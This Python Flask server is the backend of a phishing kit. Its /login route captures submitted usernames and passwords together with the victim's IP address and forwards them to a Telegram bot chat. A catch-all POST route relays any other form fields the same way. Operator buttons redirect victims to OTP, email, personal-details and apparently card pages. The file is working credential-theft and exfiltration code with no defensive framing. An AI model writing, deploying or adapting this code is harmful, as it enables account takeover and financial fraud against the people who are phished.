from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
import uuid

# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Load Telegram config
BOT_TOKEN = os.getenv("BOT_TOKEN")  # This must be your real Telegram bot token (from @BotFather)
CHAT_ID = os.getenv("CHAT_ID")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET") or "dgd773hhd"  # Optional: webhook security token

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing one or more required environment variables: BOT_TOKEN and CHAT_ID")

# Redirect buttons for approval UI
REDIRECT_BUTTONS = [
    [{"text": "OTP Page", "callback_data": "redirect_otp"}],
    [{"text": "Email Page", "callback_data": "redirect_email"}],
    [{"text": "Personal Page", "callback_data": "redirect_personal"}],
    [{"text": "Login2 Page", "callback_data": "redirect_login2"}],
    [{"text": "C Page", "callback_data": "redirect_c"}]
]

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": {
            "inline_keyboard": REDIRECT_BUTTONS
        }
    }
    try:
        res = requests.post(url, json=payload)
        print(f"[Telegram] {res.status_code}: {res.text}")
        return res.ok
    except Exception as e:
        print(f"[Telegram Error] {e}")
        return False

@app.route("/", methods=["GET"])
def root():
    return "✅ Flask server is live."

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update or 'callback_query' not in update:
            return jsonify({"status": "no callback"}), 200

        callback_data = update['callback_query']['data']
        redirect_map = {
            "redirect_otp": "otp.html",
            "redirect_email": "email.html",
            "redirect_personal": "personal.html",
            "redirect_login2": "login2.html",
            "redirect_c": "c.html"
        }

        if callback_data in redirect_map:
            send_to_telegram(f"User selected: {callback_data}")
            return jsonify({"status": "ok", "redirect_url": redirect_map[callback_data]}), 200

        return jsonify({"status": "unknown callback"}), 200
    except Exception as e:
        print(f"[Webhook Error] {e}")
        return jsonify({"status": "error"}), 500

@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.get_json()
        if not data or 'login' not in data or 'password' not in data:
            return jsonify({"success": False, "error": "Missing login or password"}), 400

        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        msg = "\n".join([
            "<b>LOGIN Submission</b>",
            f"<b>Login ID:</b> <code>{data['login']}</code>",
            f"<b>Password:</b> <code>{data['password']}</code>",
            f"<b>IP:</b> <code>{ip}</code>"
        ])
        success = send_to_telegram(msg)

        if success:
            session_id = str(uuid.uuid4())
            return jsonify({"success": True, "id": session_id}), 200
        return jsonify({"success": False, "error": "Failed to send to Telegram"}), 500
    except Exception as e:
        print(f"[Login Error] {e}")
        return jsonify({"success": False, "error": "Server error"}), 500

@app.route("/status/<id>", methods=["GET"])
def status(id):
    try:
        # Stubbed approval status — always approved with redirect
        return jsonify({"status": "approved", "redirect_url": "otp.html"}), 200
    except Exception as e:
        print(f"[Status Error] {e}")
        return jsonify({"error": "Server error"}), 500

@app.route("/<page>", methods=["POST"])
def generic_post(page):
    try:
        data = request.get_json() or request.form.to_dict()
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        lines = [f"<b>{page.upper()} Submission</b>"]
        lines += [f"<b>{k}:</b> <code>{v}</code>" for k, v in data.items()]
        lines.append(f"<b>IP:</b> <code>{ip}</code>")
        message = "\n".join(lines)
        success = send_to_telegram(message)
        return jsonify({"status": "ok" if success else "failed"}), 200 if success else 500
    except Exception as e:
        print(f"[{page} Error] {e}")
        return jsonify({"status": "failed", "error": "Server error"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)